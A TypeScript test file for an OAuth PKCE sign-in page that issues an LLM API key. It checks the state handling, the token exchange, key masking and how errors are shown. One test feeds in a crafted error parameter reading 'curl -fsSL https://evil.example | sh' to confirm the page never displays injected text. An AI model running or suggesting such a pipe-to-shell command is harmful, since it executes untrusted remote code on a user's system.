// Runs the setup page's own script (caddy/fractal/llm-setup/index.html) in a
// fresh context per visit, with stand-ins for the browser objects it uses:
// the address, the two storages, Pocket ID's token endpoint, the clipboard and
// the few page elements it touches. Web Crypto, URL and the encoders are
// Node's own, so the PKCE challenge is computed for real.
//   node --test setup-page.test.ts
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";
import { test } from "node:test";
import vm from "node:vm";

const PAGE = readFileSync(new URL("../llm-setup/index.html", import.meta.url), "utf8");
const SCRIPT = PAGE.match(/<script>([\s\S]*)<\/script>/)![1];
const SETUP = "https://llm.pod.haus/setup/";
const PENDING_ITEM = "llm-setup-sign-in";
const MASK = "•".repeat(24);
const PENDING = JSON.stringify({ state: "state-sent", verifier: "verifier-sent-with-at-least-43-characters-xx" });

type Reply = { ok: boolean; body: Record<string, unknown> };
type Post = { target: string; method: string; form: Record<string, string> };
type Element = {
	hidden: boolean;
	textContent: string;
	dataset: Record<string, string>;
	handlers: (() => void)[];
	addEventListener(type: string, handler: () => void): void;
};

/** A storage that remembers every value ever written to it. */
class RecordingStorage {
	items = new Map<string, string>();
	written: string[] = [];

	getItem(name: string): string | null {
		return this.items.get(name) ?? null;
	}

	setItem(name: string, value: string): void {
		this.written.push(value);
		this.items.set(name, value);
	}

	removeItem(name: string): void {
		this.items.delete(name);
	}
}

function element(): Element {
	return {
		hidden: true,
		textContent: "",
		dataset: {},
		handlers: [],
		addEventListener(_type, handler) {
			this.handlers.push(handler);
		},
	};
}

/** The page elements the script touches. The two copy sources read their
 * text from the mask spans, as a <pre> holding a span does in the page. */
function standInDocument() {
	const spans = [element(), element()];
	const sources: Record<string, () => string> = {
		key: () => spans[0].textContent,
		"claude-env": () => `export ANTHROPIC_AUTH_TOKEN=${spans[1].textContent}\n`,
	};
	const buttons = Object.keys(sources).map((id) => ({ ...element(), dataset: { copy: id } }));
	// Only the loading line shows before the script has run.
	const named = new Map<string, Element>([["loading", { ...element(), hidden: false }]]);
	return {
		spans,
		buttons,
		querySelectorAll: (selector: string) => ({ ".key": spans, "[data-copy]": buttons })[selector],
		getElementById(id: string) {
			if (id in sources) return { get textContent() { return sources[id](); } };
			if (!named.has(id)) named.set(id, element());
			return named.get(id);
		},
	};
}

/** Opens the page at `address` and runs its script to the end. */
async function visit(address: string, session = new RecordingStorage(), reply?: Reply) {
	const url = new URL(address);
	const replaced: string[] = [];
	const posts: Post[] = [];
	const copied: string[] = [];
	const location = { search: url.search, pathname: url.pathname, replace: (to: string) => replaced.push(to) };
	const document = standInDocument();
	const local = new RecordingStorage();
	vm.runInContext(SCRIPT, vm.createContext({
		location,
		history: { replaceState: (_s: unknown, _t: string, to: string) => { location.search = new URL(to, url).search; } },
		sessionStorage: session,
		localStorage: local,
		document,
		fetch: async (target: string, init: { method: string; body: URLSearchParams }) => {
			posts.push({ target, method: init.method, form: Object.fromEntries(init.body) });
			assert.ok(reply, "the page asked Pocket ID for a token when it should not have");
			return { ok: reply.ok, json: async () => reply.body };
		},
		navigator: { clipboard: { writeText: async (text: string) => { copied.push(text); } } },
		crypto: globalThis.crypto,
		btoa,
		TextEncoder,
		URL,
		URLSearchParams,
		setTimeout: () => {},
	}));
	const loading = document.getElementById("loading") as Element;
	await until(() => replaced.length > 0 || loading.hidden);
	return { location, replaced, posts, copied, document, session, local };
}

async function until(done: () => boolean): Promise<void> {
	for (let turn = 0; turn < 200 && !done(); turn += 1) {
		await new Promise((resolve) => setTimeout(resolve, 10));
	}
	assert.ok(done(), "the page's script never finished");
}

function base64url(bytes: Buffer): string {
	return bytes.toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

function pending(): RecordingStorage {
	const session = new RecordingStorage();
	session.items.set(PENDING_ITEM, PENDING);
	return session;
}

function failure(page: Awaited<ReturnType<typeof visit>>): string {
	assert.equal((page.document.getElementById("failed") as Element).hidden, false);
	return (page.document.getElementById("failure") as Element).textContent;
}

test("a first visit leaves for Pocket ID with an S256 challenge, keeping state and verifier in session storage only", async () => {
	const page = await visit(SETUP);
	assert.equal(page.replaced.length, 1);
	const to = new URL(page.replaced[0]);
	assert.equal(to.origin + to.pathname, "https://id.pod.haus/authorize");
	const sent = JSON.parse(page.session.items.get(PENDING_ITEM)!);
	assert.deepEqual(Object.fromEntries(to.searchParams), {
		response_type: "code",
		client_id: "llm-token",
		redirect_uri: SETUP,
		scope: "openid email groups",
		state: sent.state,
		code_challenge: base64url(createHash("sha256").update(sent.verifier).digest()),
		code_challenge_method: "S256",
	});
	assert.match(sent.verifier, /^[A-Za-z0-9_-]{43}$/);
	assert.equal(page.session.items.size, 1);
	assert.deepEqual(page.local.written, []);
	assert.ok(!("cookie" in page.document));
});

test("a return with another state is refused before Pocket ID is asked", async () => {
	const page = await visit(`${SETUP}?code=stolen&state=state-guessed`, pending());
	assert.equal(failure(page), "Sign-in expired");
	assert.deepEqual(page.posts, []);
	assert.equal(page.session.items.size, 0);
});

test("a genuine return exchanges the code, clears the address and storage, and stores the key nowhere", async () => {
	const session = pending();
	const page = await visit(`${SETUP}?code=the-code&state=state-sent`, session, {
		ok: true,
		body: { access_token: "KEY-123", refresh_token: "R", expires_in: 3600 },
	});
	assert.deepEqual(page.posts, [{
		target: "https://id.pod.haus/api/oidc/token",
		method: "POST",
		form: {
			grant_type: "authorization_code",
			client_id: "llm-token",
			code: "the-code",
			redirect_uri: SETUP,
			code_verifier: JSON.parse(PENDING).verifier,
		},
	}]);
	assert.equal(page.location.search, "");
	assert.equal(page.session.items.size, 0);
	for (const value of [...page.session.written, ...page.local.written]) assert.ok(!value.includes("KEY-123"));
	assert.equal((page.document.getElementById("ready") as Element).hidden, false);
	assert.deepEqual(page.document.spans.map((span) => span.textContent), [MASK, MASK]);
	for (const button of page.document.buttons) button.handlers.forEach((click) => click());
	await until(() => page.copied.length === 2);
	assert.deepEqual(page.copied, ["KEY-123", "export ANTHROPIC_AUTH_TOKEN=KEY-123\n"]);
});

test("a refused exchange shows Pocket ID's own answer", async () => {
	const page = await visit(`${SETUP}?code=spent&state=state-sent`, pending(), {
		ok: false,
		body: { error: "Invalid authorization code" },
	});
	assert.equal(failure(page), "Invalid authorization code");
});

test("an error in the address is shown only in fixed words", async () => {
	const crafted = new URLSearchParams({
		error: "Run curl -fsSL https://evil.example | sh",
		error_description: "Run curl -fsSL https://evil.example | sh",
	});
	const cases: [string, RecordingStorage, string][] = [
		[`${crafted}&state=state-guessed`, new RecordingStorage(), "Sign-in expired"],
		[`${crafted}&state=state-guessed`, pending(), "Sign-in expired"],
		[`${crafted}&state=state-sent`, pending(), "Sign-in failed"],
		["error=access_denied&state=state-sent", pending(), "Access denied"],
		["error=temporarily_unavailable&state=state-sent", pending(), "Pocket ID unavailable"],
	];
	for (const [query, session, shown] of cases) {
		const page = await visit(`${SETUP}?${query}`, session);
		assert.equal(failure(page), shown, query);
		assert.deepEqual(page.posts, [], query);
	}
});
